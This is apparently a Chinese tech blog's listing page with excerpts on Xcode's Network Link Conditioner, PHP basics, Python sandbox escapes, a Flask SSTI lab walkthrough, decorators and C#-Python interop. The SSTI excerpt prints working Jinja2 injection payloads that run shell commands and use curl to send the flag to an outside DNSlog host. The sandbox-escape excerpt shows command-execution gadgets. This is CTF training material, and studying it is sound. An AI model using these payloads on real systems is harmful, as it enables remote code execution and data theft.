Network Link Conditioner是一个苹果官方的网络调试工具，可以用来模拟弱网环境，因此在安装插件前需要在Mac上安装xcode工具
步骤一：
双击安装Additional_Tools_for_Xcode_13.2_Release_Candidate.dmg（建议Network Link Conditioner工具版本号与Xcode版本号保持一致）
步骤二：
双击打开“文件夹Hardware”，再次双击“Network Link Conditioner”，如图所示
步骤三：
点击“Manage Profiles…”，进入到文件信息，如图所示
步骤四：
点击“+”号按钮，创建自定义网络，如图所示
点击“-”号按钮，删除自定义网络
步骤五：
设置上行网络和下行网络，点击OK，如图所示
步骤六：
打开“ON”，网络就在弱网环境中，如图所示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b64d439e64239af99307dec7e8890565/" rel="bookmark">
			php学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PHP 简介 PHP 是服务器端脚本语言。
PHP 是什么？
PHP（全称：PHP：Hypertext Preprocessor，即"PHP：超文本预处理器"）是一种通用开源脚本语言。PHP 脚本在服务器上执行。PHP 可免费下载使用。 PHP 文件是什么？ PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器PHP 文件的默认文件扩展名是 “.php” PHP 能做什么？ PHP 可以生成动态页面内容PHP 可以创建、打开、读取、写入、关闭服务器上的文件PHP 可以收集表单数据PHP 可以发送和接收 cookiesPHP 可以添加、删除、修改您的数据库中的数据PHP 可以限制用户访问您的网站上的一些页面PHP 可以加密数据 通过 PHP，您不再限于输出 HTML。您可以输出图像、PDF 文件，甚至 Flash 电影。您还可以输出任意的文本，比如 XHTML 和 XML。
为什么使用 PHP？ PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）PHP 提供了广泛的数据库支持PHP 是免费的，可从官方的 PHP 资源下载它： www.php.netPHP 易于学习，并可高效地运行在服务器端 PHP基本语法 代码标记 在PHP历史发展中，可以使用多种标记来区分PHP脚本。
ASP标记：&lt;% php代码 %&gt;
短标记：&lt;?php php代码 ?&gt; ，以上两种基本启用，如果要使用需要在配置文件中开启
脚本标记：&lt;scritp language="php"&gt;php代码\&lt;/script&gt;
标准标记（常用）：&lt;?php php代码 ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b64d439e64239af99307dec7e8890565/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb8e9ee6155c31f5a986fd0aa7ddf349/" rel="bookmark">
			python沙箱逃逸总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python沙箱逃逸总结 让用户提交 Python 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如 os，研究怎么逃逸、防护这类沙箱还是蛮有意思的。
前言 Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。
顺便安利一本书：《流畅的 Python》。这本书有很多中高阶知识点，很全面而且讲的很清楚，如果你看过，相信理解这篇文章的大多数内容都不是问题。
接下来的内容先讲系统命令执行，再讲文件写入、读取，并且均以 oj 为例，库大多以 os 为例。
执行系统命令 基础知识 先啰嗦一些基础知识
在 Python 中执行系统命令的方式有：
oscommands：仅限2.xsubprocesstimeit：timeit.sys、timeit.timeit("__import__('os').system('whoami')", number=1)platform：platform.os、platform.sys、platform.popen('whoami', mode='r', bufsize=-1).read()pty：pty.spawn('ls')、pty.osbdb：bdb.os、cgi.syscgi：cgi.os、cgi.sys… 我写了一个脚本，测试了一下所有的导入 os 或者 sys 的库：
#-*- coding:utf8 -*- # By s1ng # in 2022-04-14 02:05:12 # ------------------------------------ # this, antigravity 库删掉 all_modules_2 = [ 'BaseHTTPServer', 'imaplib', 'shelve', 'Bastion', 'anydbm', 'imghdr', 'shlex', 'CDROM', 'argparse', 'imp', 'shutil', 'CGIHTTPServer', 'array', 'importlib', 'signal', 'Canvas', 'ast', 'imputil', 'site', 'ConfigParser', 'asynchat', 'inspect', 'sitecustomize', 'Cookie', 'asyncore', 'io', 'smtpd', 'DLFCN', 'atexit', 'itertools', 'smtplib', 'Dialog', 'audiodev', 'json', 'sndhdr', 'DocXMLRPCServer', 'audioop', 'keyword', 'socket', 'FileDialog', 'base64', 'lib2to3', 'spwd', 'FixTk', 'bdb', 'linecache', 'sqlite3', 'HTMLParser', 'binascii', 'linuxaudiodev', 'sre', 'IN', 'binhex', 'locale', 'sre_compile', 'MimeWriter', 'bisect', 'logging', 'sre_constants', 'Queue', 'bsddb', 'lsb_release', 'sre_parse', 'ScrolledText', 'bz2', 'macpath', 'ssl', 'SimpleDialog', 'cPickle', 'macurl2path', 'stat', 'SimpleHTTPServer', 'cProfile', 'mailbox', 'statvfs', 'SimpleXMLRPCServer', 'cStringIO', 'mailcap', 'string', 'SocketServer', 'calendar', 'markupbase', 'stringold', 'StringIO', 'cgi', 'marshal', 'stringprep', 'TYPES', 'cgitb', 'math', 'strop', 'Tix', 'chunk', 'md5', 'struct', 'Tkconstants', 'cmath', 'mhlib', 'subprocess', 'Tkdnd', 'cmd', 'mimetools', 'sunau', 'Tkinter', 'code', 'mimetypes', 'sunaudio', 'UserDict', 'codecs', 'mimify', 'symbol', 'UserList', 'codeop', 'mmap', 'symtable', 'UserString', 'collections', 'modulefinder', 'sys', '_LWPCookieJar', 'colorsys', 'multifile', 'sysconfig', '_MozillaCookieJar', 'commands', 'multiprocessing', 'syslog', '__builtin__', 'compileall', 'mutex', 'tabnanny', '__future__', 'compiler', 'netrc', 'talloc', '_abcoll', 'contextlib', 'new', 'tarfile', '_ast', 'cookielib', 'nis', 'telnetlib', '_bisect', 'copy', 'nntplib', 'tempfile', '_bsddb', 'copy_reg', 'ntpath', 'termios', '_codecs', 'crypt', 'nturl2path', 'test', '_codecs_cn', 'csv', 'numbers', 'textwrap', '_codecs_hk', 'ctypes', 'opcode', '_codecs_iso2022', 'curses', 'operator', 'thread', '_codecs_jp', 'datetime', 'optparse', 'threading', '_codecs_kr', 'dbhash', 'os', 'time', '_codecs_tw', 'dbm', 'os2emxpath', 'timeit', '_collections', 'decimal', 'ossaudiodev', 'tkColorChooser', '_csv', 'difflib', 'parser', 'tkCommonDialog', '_ctypes', 'dircache', 'pdb', 'tkFileDialog', '_ctypes_test', 'dis', 'pickle', 'tkFont', '_curses', 'distutils', 'pickletools', 'tkMessageBox', '_curses_panel', 'doctest', 'pipes', 'tkSimpleDialog', '_elementtree', 'dumbdbm', 'pkgutil', 'toaiff', '_functools', 'dummy_thread', 'platform', 'token', '_hashlib', 'dummy_threading', 'plistlib', 'tokenize', '_heapq', 'email', 'popen2', 'trace', '_hotshot', 'encodings', 'poplib', 'traceback', '_io', 'ensurepip', 'posix', 'ttk', '_json', 'errno', 'posixfile', 'tty', '_locale', 'exceptions', 'posixpath', 'turtle', '_lsprof', 'fcntl', 'pprint', 'types', '_md5', 'filecmp', 'profile', 'unicodedata', '_multibytecodec', 'fileinput', 'pstats', 'unittest', '_multiprocessing', 'fnmatch', 'pty', 'urllib', '_osx_support', 'formatter', 'pwd', 'urllib2', '_pyio', 'fpformat', 'py_compile', 'urlparse', '_random', 'fractions', 'pyclbr', 'user', '_sha', 'ftplib', 'pydoc', 'uu', '_sha256', 'functools', 'pydoc_data', 'uuid', '_sha512', 'future_builtins', 'pyexpat', 'warnings', '_socket', 'gc', 'quopri', 'wave', '_sqlite3', 'genericpath', 'random', 'weakref', '_sre', 'getopt', 're', 'webbrowser', '_ssl', 'getpass', 'readline', 'whichdb', '_strptime', 'gettext', 'repr', 'wsgiref', '_struct', 'glob', 'resource', 'xdrlib', '_symtable', 'grp', 'rexec', 'xml', '_sysconfigdata', 'gzip', 'rfc822', 'xmllib', '_sysconfigdata_nd', 'hashlib', 'rlcompleter', 'xmlrpclib', '_testcapi', 'heapq', 'robotparser', 'xxsubtype', '_threading_local', 'hmac', 'runpy', 'zipfile', '_warnings', 'hotshot', 'sched', 'zipimport', '_weakref', 'htmlentitydefs', 'select', 'zlib', '_weakrefset', 'htmllib', 'sets', 'abc', 'httplib', 'sgmllib', 'aifc', 'ihooks', 'sha' ] all_modules_3 = [ 'AptUrl', 'hmac', 'requests_unixsocket', 'CommandNotFound', 'apport', 'hpmudext', 'resource', 'Crypto', 'apport_python_hook', 'html', 'rlcompleter', 'DistUpgrade', 'apt', 'http', 'runpy', 'HweSupportStatus', 'apt_inst', 'httplib2', 'scanext', 'LanguageSelector', 'apt_pkg', 'idna', 'sched', 'NvidiaDetector', 'aptdaemon', 'imaplib', 'secrets', 'PIL', 'aptsources', 'imghdr', 'secretstorage', 'Quirks', 'argparse', 'imp', 'select', 'UbuntuDrivers', 'array', 'importlib', 'selectors', 'UbuntuSystemService', 'asn1crypto', 'inspect', 'shelve', 'UpdateManager', 'ast', 'io', 'shlex', '__future__', 'asynchat', 'ipaddress', 'shutil', '_ast', 'asyncio', 'itertools', 'signal', '_asyncio', 'asyncore', 'janitor', 'simplejson', '_bisect', 'atexit', 'json', 'site', '_blake2', 'audioop', 'keyring', 'sitecustomize', '_bootlocale', 'base64', 'keyword', 'six', '_bz2', 'bdb', 'language_support_pkgs', 'smtpd', '_cffi_backend', 'binascii', 'launchpadlib', 'smtplib', '_codecs', 'binhex', 'linecache', 'sndhdr', '_codecs_cn', 'bisect', 'locale', 'socket', '_codecs_hk', 'brlapi', 'logging', 'socketserver', '_codecs_iso2022', 'builtins', 'louis', 'softwareproperties', '_codecs_jp', 'bz2', 'lsb_release', 'speechd', '_codecs_kr', 'cProfile', 'lzma', 'speechd_config', '_codecs_tw', 'cairo', 'macaroonbakery', 'spwd', '_collections', 'calendar', 'macpath', 'sqlite3', '_collections_abc', 'certifi', 'macurl2path', 'sre_compile', '_compat_pickle', 'cgi', 'mailbox', 'sre_constants', '_compression', 'cgitb', 'mailcap', 'sre_parse', '_crypt', 'chardet', 'mako', 'ssl', '_csv', 'chunk', 'markupsafe', 'stat', '_ctypes', 'cmath', 'marshal', 'statistics', '_ctypes_test', 'cmd', 'math', 'string', '_curses', 'code', 'mimetypes', 'stringprep', '_curses_panel', 'codecs', 'mmap', 'struct', '_datetime', 'codeop', 'modual_test', 'subprocess', '_dbm', 'collections', 'modulefinder', 'sunau', '_dbus_bindings', 'colorsys', 'multiprocessing', 'symbol', '_dbus_glib_bindings', 'compileall', 'nacl', 'symtable', '_decimal', 'concurrent', 'netrc', 'sys', '_dummy_thread', 'configparser', 'nis', 'sysconfig', '_elementtree', 'contextlib', 'nntplib', 'syslog', '_functools', 'copy', 'ntpath', 'systemd', '_gdbm', 'copyreg', 'nturl2path', 'tabnanny', '_hashlib', 'crypt', 'numbers', 'tarfile', '_heapq', 'cryptography', 'oauth', 'telnetlib', '_imp', 'csv', 'olefile', 'tempfile', '_io', 'ctypes', 'opcode', 'termios', '_json', 'cups', 'operator', 'test', '_locale', 'cupsext', 'optparse', 'textwrap', '_lsprof', 'cupshelpers', 'orca', '_lzma', 'curses', 'os', 'threading', '_markupbase', 'datetime', 'ossaudiodev', 'time', '_md5', 'dbm', 'parser', 'timeit', '_multibytecodec', 'dbus', 'pathlib', 'token', '_multiprocessing', 'deb822', 'pcardext', 'tokenize', '_opcode', 'debconf', 'pdb', 'trace', '_operator', 'debian', 'pexpect', 'traceback', '_osx_support', 'debian_bundle', 'pickle', 'tracemalloc', '_pickle', 'decimal', 'pickletools', 'tty', '_posixsubprocess', 'defer', 'pipes', 'turtle', '_pydecimal', 'difflib', 'pkg_resources', 'types', '_pyio', 'dis', 'pkgutil', 'typing', '_random', 'distro_info', 'platform', 'ufw', '_sha1', 'distro_info_test', 'plistlib', 'unicodedata', '_sha256', 'distutils', 'poplib', 'unittest', '_sha3', 'doctest', 'posix', 'urllib', '_sha512', 'dummy_threading', 'posixpath', 'urllib3', '_signal', 'email', 'pprint', 'usbcreator', '_sitebuiltins', 'encodings', 'problem_report', 'uu', '_socket', 'enum', 'profile', 'uuid', '_sqlite3', 'errno', 'pstats', 'venv', '_sre', 'faulthandler', 'pty', 'wadllib', '_ssl', 'fcntl', 'ptyprocess', 'warnings', '_stat', 'filecmp', 'pwd', 'wave', '_string', 'fileinput', 'py_compile', 'weakref', '_strptime', 'fnmatch', 'pyatspi', 'webbrowser', '_struct', 'formatter', 'pyclbr', 'wsgiref', '_symtable', 'fractions', 'pydoc', 'xdg', '_sysconfigdata_m_linux_x86_64-linux-gnu', 'ftplib', 'pydoc_data', 'xdrlib', '_testbuffer', 'functools', 'pyexpat', 'xkit', '_testcapi', 'gc', 'pygtkcompat', 'xml', '_testimportmultiple', 'genericpath', 'pymacaroons', 'xmlrpc', '_testmultiphase', 'getopt', 'pyrfc3339', 'xxlimited', '_thread', 'getpass', 'pytz', 'xxsubtype', '_threading_local', 'gettext', 'queue', 'yaml', '_tracemalloc', 'gi', 'quopri', 'zipapp', '_warnings', 'glob', 'random', 'zipfile', '_weakref', 'grp', 're', 'zipimport', '_weakrefset', 'gtweak', 'readline', 'zlib', '_yaml', 'gzip', 'reportlab', 'zope', 'abc', 'hashlib', 'reprlib', 'aifc', 'heapq' ] methods = ['os', 'sys', '__builtins__'] results = {} for module in all_modules_3: results[module] = { 'flag': 0, 'result': {} } try: m = __import__(module) attrs = dir(m) for method in methods: if method in attrs: result = 'yes' results[module]['flag'] = 1 else: result = 'no' results[module]['result'][method] = result except Exception as e: print(e) for result in results: if results[result]['flag']: print('[+]' + result) for r in results[result]['result']: print(' [-]' + r + ': ' + results[result]['result'][r]) all_modules_2就是 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb8e9ee6155c31f5a986fd0aa7ddf349/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6366c87dfe66c40cbc2b2b76d021f98/" rel="bookmark">
			flask sssti lab闯关记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		flask ssti lab闯关记录 sstilab是一个模板注入的靶场，目前只有Flask模板注入的练习
地址：https://github.com/X3NNY/sstilabs
level 1 判断出是post方法
借用bp的intrude模块查看可以利用的类，这里查找的模块是__import__
发现80、81、82、83可以有__import__模块，加以利用得到payload
{{[].__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen("cat flag").read()}} 打过去获得flag
还可以尝试其他模块，比如__builtins__，popen，os，sys。
# __builtins__ {{().__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['__import__']('os').popen('cat flag').read()}} # popen {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat flag').read()}} # os {{().__class__.__base__.__subclasses__()[213].__init__.__globals__['os'].popen('cat flag').read()}} level 2 过滤了{ } ，用{%%}替代。这里有两种方法绕过
print标记
{%print [].__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen("cat flag").read()%} dnslog外带
{% if ().__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen("curl `cat flag`.0ppgif.ceye.io").read()=='ssti' %}1{% endif %} level 3 这道是盲注，有两种方法绕过
dnslog外带
{% for i in ''.__class__.__mro__[-1].__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__['os'].popen('curl http://`cat flag`.0ppgif.ceye.io').read()}}{% endif %}{% endfor %} 通过nc命令将文件内容回显到自己的服务器上
{% for i in ''.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6366c87dfe66c40cbc2b2b76d021f98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de535b8e922e0b9b1ff3986f03ad8f6e/" rel="bookmark">
			python函数装饰器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.1 python装饰器 装饰器(Decorators)是 Python 的一个重要部分。简单地说：他们是修改其他函数的功能的函数。他们有助于让我们的代码更简短。
python的装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。简单的说装饰器就是一个用来返回函数的函数。
1.2 python装饰器应用场景 比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。 1.3 装饰器语法糖 python提供了@符号作为装饰器的语法糖，使我们更方便的应用装饰函数。但使用语法糖要求装饰函数必须return一个函数对象。因此我们将上面的func函数使用内嵌函数包裹并return。
1.3.1 函数装饰器 （1）不带参数装饰器，不带参数函数
def use_logging(func): def _deco(): print("%s is running" % func.__name__) func() return _deco @use_logging def bar(): print('i am bar') if __name__ == '__main__': bar() 装饰器相当于执行了装饰函数use_loggin后又返回被装饰函数bar,因此bar()被调用的时候相当于执行了两个函数。等价于use_logging(bar)()。
执行结果：
bar is running
i am ba
（2）不带参数装饰器，带参数函数
def use_logging(func): def _deco(a, b): print("%s is running" % func.__name__) func(a, b) return _deco @use_logging def bar(a, b): print('i am bar:%s'%(a+b)) if __name__ == '__main__': bar(1, 2) 参数需要传入两个参数并计算值，因此我们需要对内层函数进行改动传入我们的两个参数a和b，等价于use_logging(bar)(1,2)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de535b8e922e0b9b1ff3986f03ad8f6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34c81e5b3f7594fa87bb2d9047094478/" rel="bookmark">
			c#调用python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目需要在c#运行，本人不会c#，需要将matlab的算法供c#调用，总结一下本人使用过的方法：
只想看c#调用python的可以往后翻翻，先讲matlab
首先是matlab转为c++代码 期待用matlab转c++代码，然后生成动态链接库供c#调用，这里需要用到matlab的coder工具，实际用了一下，感觉这是不可能的，因为首先matlab语法要做大量修改而且，生成的 代码很乱。特别是算法较大的时候，几乎不可能。
matlab生成动态链接库 这个是最简单的，我是用的是matlab2021b，就拿2020b举例，下载MCRII解释器好像低版本的matlab默认是下载了这个的，你在你的安装目录找到他安装就行，没安装的matlab命令行输入
&gt;&gt; compiler.runtime.download
下载完成后解压安装
查看可用的visual studio
mbuild -setup
输入命令deploytool选择第三个Library Compiler
选择.net assembly选择转换的函数设置名称空间和方法名（我之前导过，所以这里就没设置了）
会生成一个文件夹包含以下内容
新建一个控制台程序解决方案资源管理器面板右击引用选项点击添加引用，浏览找到这些文件添加引用（前面4个是我自定义的函数生成的dll，都是按刚才的方法生成的，最后一个和matlab有关，参考我的路径，找到你自己的。
因为我不是太懂，所以我直接把生成的东西都复制到项目的Debug目录了，其实好像不用这样。c#代码是参考别人改的，具体参考哪位的我也记不清了，，，见谅见谅,c#实在是不太懂。 using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using MathWorks.MATLAB.NET.Arrays; using myfunc; using CLASSIFY; namespace ConsoleApp12 { class Program { static void Main(string[] args) { Train_Model.Class1 d = new Train_Model.Class1(); eegpredict.eegpredict d1 = new eegpredict.eegpredict(); MWArray[] argsOut = new MWArray[1]; MWArray[] argsIn = new MWArray[] { }; MWArray[] argsOut1 = new MWArray[1]; MWArray[] argsIn1 = new MWArray[] { }; d.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34c81e5b3f7594fa87bb2d9047094478/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/64/">«</a>
	<span class="pagination__item pagination__item--current">65/128</span>
	<a class="pagination__item pagination__item--next btn" href="/page/66/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 追风少年的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>